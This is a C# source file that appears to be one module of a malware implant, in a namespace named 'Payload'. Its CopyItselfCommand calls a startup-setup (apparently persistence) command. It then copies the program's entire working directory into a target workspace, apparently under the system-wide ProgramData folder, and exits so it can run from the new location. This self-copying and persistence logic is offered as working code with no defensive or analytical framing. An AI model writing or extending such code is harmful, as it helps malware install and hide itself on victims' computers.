using Payload.Common;
using Payload.Core.Command;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static System.Environment;
using static System.Net.Mime.MediaTypeNames;

namespace Payload.Core.Command
{
    public class CopyItselfCommand : Payload.Command.Interface.ICommand
    {
        public override Task Execute()
        {
            new StartupSetupCommand().Execute();
            if (CheckWorkingTarget())
            {
                base.SetCommandDone(Config.EnumTaskPackMode.ONCE);
                Console.WriteLine("Copyitself :: CheckWorkingTarget");
                return null;
            }
            Copyitself();
            return null;
        }

        bool CheckWorkingTarget()
        {
            return Config.Instance.WorkSpaceDir.StartsWith(System.Environment.GetFolderPath(SpecialFolder.CommonApplicationData));
        }

        void Copy(string sourceDir, string targetDir)
        {
            Directory.CreateDirectory(targetDir);

            foreach (var file in Directory.GetFiles(sourceDir))
                File.Copy(file, Path.Combine(targetDir, Path.GetFileName(file)), true);
            

            foreach (var directory in Directory.GetDirectories(sourceDir))
                Copy(directory, Path.Combine(targetDir, Path.GetFileName(directory)));
        }

        private void Copyitself()
        {
            try
            {
                if (!Directory.Exists(Config.Instance.TargetWorkSpaceDir))
                    Directory.CreateDirectory(Config.Instance.TargetWorkSpaceDir);
                Copy(Config.Instance.WorkSpaceDir, Config.Instance.TargetWorkSpaceDir);
                base.SetCommandDone(Config.EnumTaskPackMode.EXIT);
            }
            catch (Exception e)
            {
                Console.WriteLine("Copyitself :: Exception");
            }
        }

    }
}
